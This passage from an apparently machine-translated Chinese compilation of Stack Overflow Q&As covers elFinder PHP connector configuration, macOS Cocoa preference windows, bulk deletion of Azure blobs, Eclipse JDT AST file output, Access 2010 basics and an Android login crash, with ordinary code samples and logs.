            'application/x-gzip' => array(
                'cmd'  => 'tar',
                'argc' => '-xzf',
                'ext'  => 'tar.gz'
                ),
            'application/x-bzip2' => array(
                'cmd'  => 'tar',
                'argc' => '-xjf',
                'ext'  => 'tar.bz'
                )
            )
        )
);

$fm = new elFinder($opts); 
$fm->run();

?> 
```

连接器图标.php

```
<?php

error_reporting(0); // Set E_ALL for debuging

if (function_exists('date_default_timezone_set')) {
    date_default_timezone_set('Europe/Moscow');
}

include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinder.class.php';

/**
 * Simple example how to use logger with elFinder
 **/
class elFinderLogger implements elFinderILogger {

    public function log($cmd, $ok, $context, $err='', $errorData = array()) {
        if (false != ($fp = fopen('./log.txt', 'a'))) {
            if ($ok) {
                $str = "cmd: $cmd; OK; context: ".str_replace("\n", '', var_export($context, true))."; \n";
            } else {
                $str = "cmd: $cmd; FAILED; context: ".str_replace("\n", '', var_export($context, true))."; error: $err; errorData: ".str_replace("\n", '', var_export($errorData, true))."\n";
            }
            fwrite($fp, $str);
            fclose($fp);
        }
    }

}

$opts = array(
    'root'            => '../../../../examicon/',                       // path to root directory
    'URL'             => "examicon/", // root directory URL
    'rootAlias'       => 'Home',       // display this instead of root directory name
    //'uploadAllow'   => array('images/*'),
    //'uploadDeny'    => array('all'),
    //'uploadOrder'   => 'deny,allow'
    // 'disabled'     => array(),      // list of not allowed commands
    // 'dotFiles'     => false,        // display dot files
    // 'dirSize'      => true,         // count total directories sizes
    // 'fileMode'     => 0666,         // new files mode
    // 'dirMode'      => 0777,         // new folders mode
    // 'mimeDetect'   => 'internal',       // files mimetypes detection method (finfo, mime_content_type, linux (file -ib), bsd (file -Ib), internal (by extensions))
    // 'uploadAllow'  => array(),      // mimetypes which allowed to upload
    // 'uploadDeny'   => array(),      // mimetypes which not allowed to upload
    // 'uploadOrder'  => 'deny,allow', // order to proccess uploadAllow and uploadAllow options
    // 'imgLib'       => 'mogrify',       // image manipulation library (imagick, mogrify, gd)
    // 'tmbDir'       => '.tmb',       // directory name for image thumbnails. Set to "" to avoid thumbnails generation
    // 'tmbCleanProb' => 1,            // how frequiently clean thumbnails dir (0 - never, 100 - every init request)
    // 'tmbAtOnce'    => 5,            // number of thumbnails to generate per request
    // 'tmbSize'      => 48,           // images thumbnails size (px)
    // 'fileURL'      => true,         // display file URL in "get info"
    // 'dateFormat'   => 'j M Y H:i',  // file modification date format
    // 'logger'       => null,         // object logger
    // 'defaults'     => array(        // default permisions
    //  'read'   => true,
    //  'write'  => true,
    //  'rm'     => true
    //  ),
    // 'perms'        => array(),      // individual folders/files permisions    
    // 'debug'        => true,         // send debug to client
    'archiveMimes' => array(),      // allowed archive's mimetypes to create. Leave empty for all available types.
    // 'archivers'    => array()       // info about archivers to use. See example below. Leave empty for auto detect
     'archivers' => array(
        'create' => array(
            'application/x-gzip' => array(
                'cmd' => 'tar',
                'argc' => '-czf',
                'ext'  => 'tar.gz'
                )
            ),
        'extract' => array(
            'application/x-gzip' => array(
                'cmd'  => 'tar',
                'argc' => '-xzf',
                'ext'  => 'tar.gz'
                ),
            'application/x-bzip2' => array(
                'cmd'  => 'tar',
                'argc' => '-xjf',
                'ext'  => 'tar.bz'
                )
            )
        )
);

$fm = new elFinder($opts); 
$fm->run();

?> 
```

第三个文件太大，无法包含在这篇文章中。但这甚至可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:22:30.520

尽管可能存在一些自动化工具，但我强烈反对它。每种语言都有其特点，原始转换很少是一个好主意。

按照其他建议做 - 自己重写，不要依赖某些工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:54:34.310

也许你可以使用它（我不知道它是什么，因为我不知道 asp 到底是做什么的）

[http://www.asp.net/downloads/archived-v11/migration-assistants/php-to-aspnet](http://www.asp.net/downloads/archived-v11/migration-assistants/php-to-aspnet)

# objective-c - 如何为 Mac 创建 Cocoa 应用程序首选项？

> ID：10148788
> 
> 赞同：15
> 
> 时间：2012-04-13T21:52:13.187
> 
> 标签：objective-c, macos, cocoa

我在 Xcode for Mac 中创建了一个简单的应用程序，它可以很好地构建和编译。

如何创建首选项菜单？有没有简单的方法或者我必须创建一个新界面？然后我如何获取并将值放入这些偏好中？

我确实找到了一个教程，但它是针对 iOS 的，从我所见，如果您正在为 Mac 开发，则“设置包”不可用。

编辑：以下链接非常适合：[https ://developer.apple.com/cocoa/cocoabindings.html](https://developer.apple.com/cocoa/cocoabindings.html)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-13T22:10:32.233

[这是您想要的文档。](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/UserDefaults/Introduction/Introduction.html) 更具体地说[，如何提供首选项接口](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/UserDefaults/AboutPreferenceDomains/AboutPreferenceDomains.html#//apple_ref/doc/uid/10000059i-CH2-SW3)。

无论如何，您必须像制作任何其他窗口一样制作自己的首选项菜单/窗口，并且有一些控件允许修改然后存储在用户默认值字典中的值，该字典通常存储用户首选项（a Cocoa Bindings 非常简单的过程）。

否则，手动地，您可能需要一个参考，`[NSUserDefaults standardUserDefaults]`以便您可以`-setObject:ForKey:`等等。阅读上面链接的整个文档（包括其他部分）是明智的。

有关如何使用 Cocoa 绑定来存储/检索首选项的更多信息，请参阅[此处](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CocoaBindings/Concepts/NSUserDefaultsController.html#//apple_ref/doc/uid/TP40001092)`NSUserDefaults`的 Apple 文档。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-08T20:01:16.923

对于窗口本身，我会推荐[RHPreferences](http://rheard.com/blog/2012/06/rhpreferences/)框架。

在[GitHub](https://bitly.com/NxXn1e)上可用。BSD 许可。

它是一个简单易用的首选项窗口控制器，带有多个选项卡，适用于您的下一个 Mac 应用程序。

它还提供：

*   在不同大小的选项卡视图之间自动调整大小（带动画）
*   自定义 NSToolbarItem 支持
*   最后使用的选项卡的持久性
*   支持占位符 NSToolbarItems（例如 NSToolbarFlexibleSpaceItemIdentifier 和 NSToolbarShowFontsItemIdentifier）

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2019-02-23T08:49:49.720

> **NSTabViewController.TabStyle.toolbar** - 一种自动将任何选项卡添加到窗口工具栏的样式。选项卡视图控制器控制窗口的工具栏并将自己设置为工具栏的委托。

[https://developer.apple.com/documentation/appkit/nstabviewcontroller/tabstyle](https://developer.apple.com/documentation/appkit/nstabviewcontroller/tabstyle)

请记住，我们可以`NSWindowController`使用`NSWindow.contentViewController`set 来创建`NSTabViewController`标准 macOS Preferences 窗口。

这是一个由代码（Swift 4）制作的首选项窗口：

文件：**PreferencesPageID.swift** – 保留 Preference 页面属性。在回调中使用。

```
enum PreferencesPageID: Int, CaseIterable {

   case generic, misc

   var image: NSImage? {
      switch self {
      case .generic:
         return NSImage(named: NSImage.folderSmartName)
      case .misc:
         return NSImage(named: NSImage.networkName)
      }
   }

   var title: String {
      switch self {
      case .generic:
         return "Some"
      case .misc:
         return "Other"
      }
   }
} 
```

文件：**PreferencesTabView.swift** - 代表偏好页面内容视图。

```
class PreferencesTabView: View {

   let id: PreferencesPageID

   init(id: PreferencesPageID) {
      self.id = id
      super.init()
   }

   required init?(coder decoder: NSCoder) {
      fatalError()
   }

   override func setupUI() {
      switch id {
      case .generic:
         backgroundColor = .red
         setIntrinsicContentSize(CGSize(width: 400, height: 200))
      case .misc:
         backgroundColor = .blue
         setIntrinsicContentSize(CGSize(width: 400, height: 300))
      }
   }
} 
```

文件：**PreferenceItemViewController.swift** - 保持 Preference 页面内容视图的控制器。主要用于满足 macOS SDK 要求。

```
class PreferenceItemViewController: ViewController {

   private let contentView: PreferencesTabView

   override func loadView() {
      view = contentView
   }

   init(view: PreferencesTabView) {
      contentView = view
      super.init(nibName: nil, bundle: nil)
   }

   required init?(coder: NSCoder) {
      fatalError()
   }    

   override func viewDidLayout() {
       super.viewDidLayout()
       preferredContentSize = view.intrinsicContentSize
   }    
} 
```

文件：**PreferencesViewController.swift** – 用作`NSWindow.contentViewController`.

```
class PreferencesViewController: TabViewController {

   enum Event {
      case selected(PreferencesPageID)
   }

   var eventHandler: ((Event) -> Void)?

   override func setupUI() {
      tabStyle = .toolbar // This will "turn" View Controller to standard Preferences window.
      transitionOptions = .allowUserInteraction
      canPropagateSelectedChildViewControllerTitle = false
      let views = [PreferencesTabView(id: .generic), PreferencesTabView(id: .misc)]
      views.forEach {
         let item = NSTabViewItem(viewController: PreferenceItemViewController(view: $0))
         item.label = $0.id.title
         item.image = $0.id.image
         addTabViewItem(item)
      }
   }

   override func tabView(_ tabView: NSTabView, didSelect tabViewItem: NSTabViewItem?) {
      super.tabView(tabView, didSelect: tabViewItem)
      if let view = tabViewItem?.viewController?.view as? PreferencesTabView {
         eventHandler?(.selected(view.id))
      }
   }

} 
```

文件：**PreferencesWindowController.swift** - 首选项窗口控制器。

```
private class PreferencesWindowController: NSWindowController {

   private(set) lazy var viewController = PreferencesViewController()

   init() {
      let rect = CGRect(x: 400, y: 200, width: 400, height: 300)
      let window = NSWindow(contentRect: rect, styleMask: [.titled, .closable], backing: .buffered, defer: true)
      super.init(window: window)

      setupHandlers()

      let frameSize = window.contentRect(forFrameRect: window.frame).size
      viewController.view.setFrameSize(frameSize)
      window.contentViewController = viewController
   }

   required init?(coder: NSCoder) {
      fatalError()
   }

   // MARK: - Private

   private func setupHandlers() {
      viewController.eventHandler = { [weak self] in
         switch $0 {
         case .selected(let id):
            self?.window?.title = "Preferences — " + id.title
         }
      }
   }

} 
```

用法：

```
public class Application: NSApplication {

   private lazy var preferencesController = PreferencesWindowController()

   // Called from code or via IBAction
   private func showPreferences() {
      preferencesController.showWindow(nil)
   }

} 
```

[![首选项屏幕](../Images/214667384ddfdb20b65563fb700f96bc.png)](https://i.stack.imgur.com/f7ZjH.png)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-13T22:05:37.503

[Apple 的文档可能是您想要查看的内容。](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/UserDefaults/AccessingPreferenceValues/AccessingPreferenceValues.html#//apple_ref/doc/uid/10000059i-CH3-SW1)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-08-05T02:06:28.427

在`MainMenu.xib`您的项目中，单击您的应用名称后，您将看到一个下拉列表。Cntrl + 单击 + 拖动`Preferences`到项目`AppDelegate.h`文件并创建 IBAction 方法。

使用 xib 创建一个带有 NSWindowController (PreferenceWindowController) 的类，创建该 PreferenceWindowController 的强属性，分配初始化它并添加`[self.preferenceWindowController showWindow:self];`到 AppDelegate.m。`Preferences`这将为您的 OS X 应用程序创建一个窗口。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-04-08T19:54:03.570

为您的每个首选项窗格创建一个 .nib 和一个控制器 (.h & .m)。然后将它们动态连接到您应用的 AppDelegate.m 中。我在我的应用程序中使用它，它由一些动态加载的包组成，这样每个包都有自己的偏好。

你可以在这里看到一个非常简洁的例子： [http ://www.knowstack.com/nstoolbar-sample-code-objectivec/](http://www.knowstack.com/nstoolbar-sample-code-objectivec/)

在这个例子中，它动态地创建了 NSToolbar 和 NSToolbarItem。您在每个首选项窗格的每个窗口控制器中执行的操作取决于您。

这是 AppDelegate.m 的主要部分：

```
//  AppDelegate.m
//  CocoaToolBars
//  Created by Debasis Das on 4/30/15.
//  Copyright (c) 2015 Knowstack. All rights reserved.

#import "AppDelegate.h"
@interface AppDelegate ()
@property (weak) IBOutlet NSWindow *window;
@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
  // Insert code here to initialize your application
  _toolbarTabsArray = [self toolbarItems];
  _toolbarTabsIdentifierArray = [NSMutableArray new];

  for (NSDictionary *dict in _toolbarTabsArray){
    [_toolbarTabsIdentifierArray addObject:dict[@"identifier"]];
  }
  _toolbar = [[NSToolbar alloc]    initWithIdentifier:@"ScreenNameToolbarIdentifier"];
  _toolbar.allowsUserCustomization = YES;
  _toolbar.delegate = self;
  self.window.toolbar = _toolbar;
}  

-(NSArray *)toolbarItems {
  NSArray *toolbarItemsArray = [NSArray arrayWithObjects:
                               [NSDictionary    dictionaryWithObjectsAndKeys:@"Find Departments",@"title",@"Department-50",@"icon",@"DepartmentViewController",@"class",@"DepartmentViewController",@"identifier", nil],
                              [NSDictionary dictionaryWithObjectsAndKeys:@"Find Accounts",@"title",@"Business-50",@"icon",@"AccountViewController",@"class",@"AccountViewController",@"identifier", nil],
                              [NSDictionary dictionaryWithObjectsAndKeys:@"Find Employees",@"title",@"Edit User-50",@"icon",@"EmployeeViewController",@"class",@"EmployeeViewController",@"identifier", nil],
                              nil];
  return  toolbarItemsArray;
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
  // Insert code here to tear down your application
}

- (NSToolbarItem *)toolbar:(NSToolbar *)toolbar
   itemForItemIdentifier:(NSString *)itemIdentifier willBeInsertedIntoToolbar:(BOOL)flag {
  NSDictionary *itemInfo = nil;

  for (NSDictionary *dict in _toolbarTabsArray) {
    if([dict[@"identifier"] isEqualToString:itemIdentifier]) {
      itemInfo = dict;
      break;
    }
  }

  NSAssert(itemInfo, @"Could not find preferences item: %@", itemIdentifier);

  NSImage *icon = [NSImage imageNamed:itemInfo[@"icon"]];
  if(!icon) {
    icon = [NSImage imageNamed:NSImageNamePreferencesGeneral];
  }
  NSToolbarItem *item = [[NSToolbarItem alloc] initWithItemIdentifier:itemIdentifier];
  item.label = itemInfo[@"title"];
  item.image = icon;
  item.target = self;
  item.action = @selector(viewSelected:);
  return item;
}

-(void)viewSelected:(id)sender {
  NSToolbarItem *item = sender;
  [self loadViewWithIdentifier:item.itemIdentifier withAnimation:YES];
}

-(void)loadViewWithIdentifier:(NSString *)viewTabIdentifier
                      withAnimation:(BOOL)shouldAnimate {
  NSLog(@"viewTabIdentifier %@",viewTabIdentifier);

  if ([_currentView isEqualToString:viewTabIdentifier]) {
    return;
  } else {
    _currentView = viewTabIdentifier;
  }
  //Loop through the view array and find out the class to load

  NSDictionary *viewInfoDict = nil;
  for (NSDictionary *dict in _toolbarTabsArray) {
    if ([dict[@"identifier"] isEqualToString:viewTabIdentifier]) {
      viewInfoDict = dict;
      break;
    }
  }
  NSString *class = viewInfoDict[@"class"];
  if(NSClassFromString(class)) {
    _currentViewController = [[NSClassFromString(class) alloc] init];
    NSView *newView = _currentViewController.view;

    NSRect windowRect = self.window.frame;
    NSRect currentViewRect = newView.frame;

    windowRect.origin.y = windowRect.origin.y + (windowRect.size.height - currentViewRect.size.height);
    windowRect.size.height = currentViewRect.size.height;
    windowRect.size.width = currentViewRect.size.width;

    self.window.title = viewInfoDict[@"title"];
    [self.window setContentView:newView];
    [self.window setFrame:windowRect display:YES animate:shouldAnimate];      
  } else {
    NSAssert(false, @"Couldn't load %@", class);
  }
}

- (NSArray *)toolbarDefaultItemIdentifiers:(NSToolbar *)toolbar {
  NSLog(@"%s %@",__func__,_toolbarTabsIdentifierArray);
  return _toolbarTabsIdentifierArray;
}

- (NSArray *)toolbarAllowedItemIdentifiers:(NSToolbar *)toolbar {
  NSLog(@"%s",__func__);
  return [self toolbarDefaultItemIdentifiers:toolbar];
}

- (NSArray *)toolbarSelectableItemIdentifiers:(NSToolbar *)toolbar {
  NSLog(@"%s",__func__);
return [self toolbarDefaultItemIdentifiers:toolbar];
}

- (void)toolbarWillAddItem:(NSNotification *)notification {
  NSLog(@"%s",__func__);
}

- (void)toolbarDidRemoveItem:(NSNotification *)notification {
  NSLog(@"%s",__func__);
}

@end 
```

# azure - 删除所有包含在 blob 存储中的名称

> ID：10148794
> 
> 赞同：4
> 
> 时间：2012-04-13T21:52:30.040
> 
> 标签：azure, azure-storage, azure-blob-storage

我正在尝试删除 Blob 存储中树下名为“缓存”的容器中的所有内容。

我的结构是这样的

```
-Root
    -Bin
    -Media
       -1324
         -cached
       -5648
         -cached
    -Images
       -cached 
```

我想删除“缓存”文件夹中“媒体”下的所有内容。

有什么好的方法呢？手写代码？我有大约 100,000 个文件夹，其中包含我想删除的“缓存”名称。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-15T20:18:45.800

也许一些正则表达式可以解决问题？

```
string pattern = @"/devstoreaccount1/Root/Media/([A-Za-z0-9\-]+)/cached/([A-Za-z0-9\-]+)";
CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();
foreach (var blob in blobClient.GetContainerReference("Root").ListBlobs(new BlobRequestOptions { UseFlatBlobListing = true }))
{
    if (Regex.Match(blob.Uri.AbsolutePath, pattern).Success)
    {
        ((CloudBlockBlob)blob).Delete();
    }
} 
```

当然，您应该首先针对存储模拟器中的一些测试数据进行测试，并注意当您切换到真正的云存储时，需要调整该模式。

希望能帮助到你...

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-07T22:16:51.353

这是使用 Azure Storage 4.3.0.0 的新方法

```
public void DeleteFolder(string Container, string Prefix)
        {
            if (!string.IsNullOrEmpty(Prefix))
            {
                var _Container = GetBlobContainer(Container);
                var _Blobs = _Container.ListBlobs(Prefix, true);
                foreach (IListBlobItem blob in _Blobs)
                {
                    _Container.GetBlockBlobReference(((CloudBlockBlob)blob).Name).DeleteIfExists();
                }
            }
        } 
```

* * *

```
public CloudBlobContainer GetBlobContainer(string container)
        {
            // Retrieve storage account from connection string.
            CloudStorageAccount _StorageAccount = CloudStorageAccount.Parse(
                CloudConfigurationManager.GetSetting("StorageConnectionString"));

            // Create the blob client.
            CloudBlobClient _BlobClient = _StorageAccount.CreateCloudBlobClient();

            // Retrieve a reference to a container. 
            CloudBlobContainer _Container = _BlobClient.GetContainerReference(container);

            // Retrieve reference to a blob named "myblob".
            return _Container;
        } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-21T15:09:35.087

在 Windows Azure 存储中，您只有 1 个容器深度。其他所有内容实际上都是 blob 名称的一部分。因此，在您的情况下，您有一个“根”容器和一堆名为“media/1324/cached/blobname”的 blob 文件。在这种情况下，它只是一个带有分隔符的长字符串'/'。

在您的场景中，使用“媒体”的 ListBlobs 操作的“前缀”过滤器枚举“根”容器下的每个 Blob 是最简单的。一旦您将 blob 过滤为以“媒体”开头，然后遍历它们并找到其中也包含“缓存”的那些。

如果您选择了不同的命名约定，您可以让 Blob 存储与您一起查找文件。但是，您需要切换名称，以便首先出现“缓存”（例如“媒体/缓存/1234/blobname”）。然后，您可以再次使用 ListBlobs 按前缀进行过滤，并且只返回以“媒体/缓存”开头的 Blob。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-04-14T02:07:11.490

您可以随时使用[http://azurestorageexplorer.codeplex.com/](http://azurestorageexplorer.codeplex.com/) 无需编写任何代码

# ios - 如何使用 NSURLConnection 获取渲染的 JavaScript 源代码

> ID：10148795
> 
> 赞同：2
> 
> 时间：2012-04-13T21:52:32.807
> 
> 标签：ios, macos, cocoa, nsurlconnection

我想为主要由 javascript 组成的页面获取渲染的 html 源代码。无论如何我可以使用 NSURLConnection 得到这个吗？如果是这样，我将如何构建请求？

这样做的原因是我需要解析页面上的一些数据——但我不必实际显示页面本身；这就是为什么我不想使用 UIWebView。

**更新**

所以我正在做的是为乐队创建一个应用程序。乐队已经有一个网站（由 BandZoogle 提供支持），网站上列出了巡演日期。他们希望我解析网站并根据这些巡演日期更新应用程序。但是，BandZoogle 完全是 javascript - 所以我不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:59:57.677

您不能强制服务器执行 JavaScript - 它只能在客户端执行。但是您可以为此使用 Node.JS。

或者，您可以使用 php 然后 echo 来获取执行的请求。

还有 Meteor 框架，可以让您在 JavaScript 上编写服务器端。 [http://meteor.com/main](http://meteor.com/main)

# java - Eclipse JDT AST：如何将生成的 AST 写入 java 文件？

> ID：10148802
> 
> 赞同：4
> 
> 时间：2012-04-13T21:53:28.747
> 
> 标签：java, eclipse, abstract-syntax-tree, eclipse-jdt

我目前正在使用 eclipse AST 来生成源代码。除了在大多数示例中，我从头开始生成源代码并在一个独立的应用程序中，而不是一个 Eclipse 插件。

当从 ASTParser 读入时，您可以通过调用 激活修改`recordModifications()`，但是当从头开始创建 AST 时，这不起作用，例如通过调用`newCompilationUnit()`.

`Document`因此，无法通过 a 将源写入文件`TextEdit`- 有一个异常表示尚未启用修改记录。
从头开始生成 AST 并写入文件的任何经验？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-21T21:52:06.070

为什么不先创建文件，然后从中生成 AST，如下所示：

```
ICompilationUnit unit = JavaCore.createCompilationUnitFrom(file);
ASTParser parser = ASTParser.newParser(AST.JLS3);
parser.setKind(ASTParser.K_COMPILATION_UNIT);
parser.setResolveBindings(true);
parser.setSource(unit);
// Parse the source code and generate an AST.
CompilationUnit ast = (CompilationUnit) parser.createAST(null); 
```

如果文件是新创建的并且是空白的，那么大概 AST 将是空的，然后您可以替换`ast`对象的根并将其写入文件。此外，如果您没有绑定到 Eclipse，您可以使用 JSR199 标准做同样的事情，并以正常方式将该 AST 写入文件。请参阅[此处](http://today.java.net/pub/a/today/2008/04/10/source-code-analysis-using-java-6-compiler-apis.html)了解介绍。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T19:41:04.423

谢谢你的建议！与此同时，我找到了一种通过内部类“ASTFlatener”发出源代码的方法，该类创建了一个 AST 的字符串表示。这对我来说效果很好......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-15T11:40:50.797

我一直在努力寻找同一个问题的答案。根据上面的答案，到目前为止我发现的最优雅的解决方案如下：

```
ASTParser parser = ASTParser.newParser(AST.JLS4);
parser.setCompilerOptions(....);

Document document = new Document("");
parser.setSource(document.get().toCharArray());
CompilationUnit unit = (CompilationUnit)parser.createAST(null);
unit.recordModifications();

TextEdit edits = unit.rewrite(document, null);
edits.apply(document);

// now write document.get() to file 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-21T19:37:34.087

如果您从头开始生成源，也许您可​​以编写能够解析到临时文件的最小源，将您的修改应用于 Ast，然后将其作为文本编辑写回该文件，就像您不这样做一样。然后阅读源码。然后，您可以将其转移到您想要的任何地方。

可能有一个更优雅的解决方案，但这可能有效。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-06-12T14:12:14.877

从 AST 创建一个编译单元后，我正在做：

```
AST ast = AST.newAST(AST.JLS4);    
CompilationUnit unit = ast.newCompilationUnit(); 
```

...填充编译单元，然后...

```
package.createCompilationUnit(className + ".java", unit.toString(), true, null); 
```

其中：
`package`= `IPackageFragment`
`className`= `String`(生成的类名)
`unit`=> `CompilationUnit`ast
`true`=> 强制替换
`null`=> 进度监视器

# database - ACCESS 2010 初学者需求指南

> ID：10148807
> 
> 赞同：0
> 
> 时间：2012-04-13T21:53:47.003
> 
> 标签：database, ms-access, database-design, programming-languages

所以，我得到了一份新工作，我必须编写一个数据库系统，这实际上非常简单。我需要一个完整的条形码，一个完整的员工，也许还有一个。制作数据库没有问题，但是我不知道如何编写程序来自动化它。我需要制作一个在扫描条形码时自动插入条形码的程序。我还需要进行一些查询以获取员工信息。我也需要删除一些东西。

我有使用 SQL(PHP MySQL) 和 Android 本地数据库程序的经验。我对数据库查询等非常熟悉，但是我不知道如何为 ACCESS 编写这些。它是内置的，还是我使用不同的语言？我假设它是用 C/C++ 之类的本机编写的（这将是编写它的更可取的语言之一）。我不知道 Java、C# 或 VB。在接下来的几天里，我需要快速学习这些东西。我找不到任何好的教程，微软的也不好。

我会很感激任何帮助，谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:22:49.830

所以听起来你的问题是如何在访问中创建一个表单来插入记录？网上有很多关于这类事情的教程。自从我使用 Access 开发以来已经有一段时间了（呃，但它的开发速度真的很快），但看起来事情变得更加自动化了。我喜欢视频教程。

试试这个：

[创建数据输入表单以访问 2010 基本培训](http://www.youtube.com/watch?v=_qS1qr5tUe0)

（谷歌类似“访问 2010 创建输入表单”的更多信息）

# java - 有人可以帮助我使用 PHP、MySQL 和 SQLite 进行 Android 登录和注册吗？

> ID：10148808
> 
> 赞同：0
> 
> 时间：2012-04-13T21:53:56.430
> 
> 标签：java, android

嗨，我使用 android hive 示例创建了文件，但我似乎遇到了以下我无法弄清楚的错误。我的 UI 工作正常，只要我点击登录按钮或注册按钮，它就会强制关闭请帮助？

> ```
> 04-13 14:41:31.911: D/dalvikvm(431): GC_FOR_MALLOC freed 3881 objects / 200672 bytes in 88ms
> 04-13 14:41:32.110: E/JSON(431): <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
> 04-13 14:41:32.110: E/JSON(431): <html><head>
> 04-13 14:41:32.110: E/JSON(431): <title>404 Not Found</title>
> 04-13 14:41:32.110: E/JSON(431): </head><body>
> 04-13 14:41:32.110: E/JSON(431): <h1>Not Found</h1>
> 04-13 14:41:32.110: E/JSON(431): <p>The requested URL /android_login_api/ was not found on >     this server.</p>
> 04-13 14:41:32.110: E/JSON(431): </body></html>
> 04-13 14:41:32.120: E/JSON Parser(431): Error parsing data org.json.JSONException: Value <!>     DOCTYPE of type java.lang.String cannot be converted to JSONObject
> 04-13 14:41:32.131: D/AndroidRuntime(431): Shutting down VM
> 04-13 14:41:32.131: W/dalvikvm(431): threadid=1: thread exiting with uncaught exception >     >     (group=0x4001d800)
> 04-13 14:41:32.131: E/AndroidRuntime(431): FATAL EXCEPTION: main
> 04-13 14:41:32.131: E/AndroidRuntime(431): java.lang.NullPointerException
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at com.screenssample.LoginActivity$1.onClick>     >     (LoginActivity.java:59)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.view.View.performClick(View.java:2408)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.view.View$PerformClick.run>     >     >     (View.java:8816)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.os.Handler.handleCallback>     >     >     (Handler.java:587)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.os.Handler.dispatchMessage>     >     >     (Handler.java:92)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.os.Looper.loop(Looper.java:123)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at android.app.ActivityThread.main>     >     >     (ActivityThread.java:4627)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at java.lang.reflect.Method.invokeNative(Native >     Method)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at java.lang.reflect.Method.invoke>     >     >     (Method.java:521)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at om.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
> 04-13 14:41:32.131: E/AndroidRuntime(431):    at dalvik.system.NativeStart.main(Native Method) 
> ```

LoginActivity 代码读取

包 com.screenssample；

> ```
> import java.util.HashMap; 
> 
> import org.json.JSONException; 
> import org.json.JSONObject; 
> 
> import android.app.Activity; 
> import android.content.Intent; 
> import android.os.Bundle; 
> import android.util.Log; 
> import android.view.View; 
> import android.widget.Button; 
> import android.widget.EditText; 
> import android.widget.TextView; 
> 
> import com.screenssample.DatabaseHandler; 
> import com.screenssample.UserFunctions; 
> 
> public class LoginActivity extends Activity { 
>     Button btnLogin; 
>     Button btnLinkToRegister; 
>     EditText inputEmail; 
>     EditText inputPassword; 
>    TextView loginErrorMsg; 
> ```

```
// JSON Response node names 
private static String KEY_SUCCESS = "success"; 
private static String KEY_ERROR = "error"; 
private static String KEY_ERROR_MSG = "error_msg"; 
private static String KEY_UID = "uid"; 
private static String KEY_NAME = "name"; 
private static String KEY_EMAIL = "email"; 
private static String KEY_CREATED_AT = "created_at"; 

@Override
public void onCreate(Bundle savedInstanceState) { 
    super.onCreate(savedInstanceState); 
    setContentView(R.layout.login); 

    // Importing all assets like buttons, text fields 
    inputEmail = (EditText) findViewById(R.id.loginEmail); 
    inputPassword = (EditText) findViewById(R.id.loginPassword); 
    btnLogin = (Button) findViewById(R.id.btnLogin); 
    btnLinkToRegister = (Button) findViewById(R.id.btnLinkToRegisterScreen); 
    loginErrorMsg = (TextView) findViewById(R.id.login_error); 

    // Login button Click Event 
    btnLogin.setOnClickListener(new View.OnClickListener() { 

        public void onClick(View view) { 
            String email = inputEmail.getText().toString(); 
            String password = inputPassword.getText().toString(); 
            UserFunctions userFunction = new UserFunctions(); 
            JSONObject json = userFunction.loginUser(email, password); 

            // check for login response 
            try { 
                if (json.getString(KEY_SUCCESS) != null) { 
                    loginErrorMsg.setText(""); 
                    String res = json.getString(KEY_SUCCESS); 
                    if(Integer.parseInt(res) == 1){ 
                        // user successfully logged in 
                        // Store user details in SQLite Database 
                        DatabaseHandler db = new DatabaseHandler(getApplicationContext()); 
                        JSONObject json_user = json.getJSONObject("user"); 

                        // Clear all previous data in database 
                        userFunction.logoutUser(getApplicationContext()); 
                        db.addUser(json_user.getString(KEY_NAME), json_user.getString(KEY_EMAIL), json.getString(KEY_UID), json_user.getString(KEY_CREATED_AT));                         

                        // Launch Dashboard Screen 
                        Intent dashboard = new Intent(getApplicationContext(), DashboardActivity.class); 

                        // Close all views before launching Dashboard 
                        dashboard.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP); 
                        startActivity(dashboard); 

                        // Close Login Screen 
                        finish(); 
                    }else{ 
                        // Error in login 
                        loginErrorMsg.setText("Incorrect username/password"); 
                    } 
                } 
            } catch (JSONException e) { 
                e.printStackTrace(); 
            } 
        } 
    }); 

    // Link to Register Screen 
